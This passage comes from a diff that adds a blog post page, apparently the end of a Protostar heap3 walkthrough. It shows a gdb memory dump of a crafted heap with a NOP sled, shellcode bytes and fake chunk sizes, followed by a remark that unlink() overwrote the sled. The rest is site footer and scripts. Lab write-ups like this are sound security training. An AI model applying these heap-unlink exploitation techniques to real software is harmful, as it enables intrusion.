+0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:	0x0804c008
+(gdb) x/20x 0x0804c008
+0x804c008:	0x00000000	0x90909090	0x0804b11c	0x90909090
+0x804c018:	0x90909090	0x04886468	0x4141c308	0xfffffff8
+0x804c028:	0xfffffffc	0xfffffffc	0xfffffff9	0x0804b194
+0x804c038:	0x0804b194	0x00000000	0x00000000	0x00000000
+0x804c048:	0x00000000	0x00000000	0x00000000	0x00000fb1
+</code></pre>
+
+<p>We can also see that part of our NOP sled has been overwritten by <strong>unlink()</strong></p>
+
+<p>A great write up can be found <a href="http://conceptofproof.wordpress.com/2013/11/19/protostar-heap3-walkthrough/">here</a></p>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/protostar"><span class="tag">Protostar</span></a></li>
+        
+          <li><a href="/tags/heap0"><span class="tag">Heap0</span></a></li>
+        
+          <li><a href="/tags/heap1"><span class="tag">Heap1</span></a></li>
+        
+          <li><a href="/tags/heap2"><span class="tag">Heap2</span></a></li>
+        
+          <li><a href="/tags/heap3"><span class="tag">Heap3</span></a></li>
+        
+          <li><a href="/tags/heap4"><span class="tag">Heap4</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2134</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
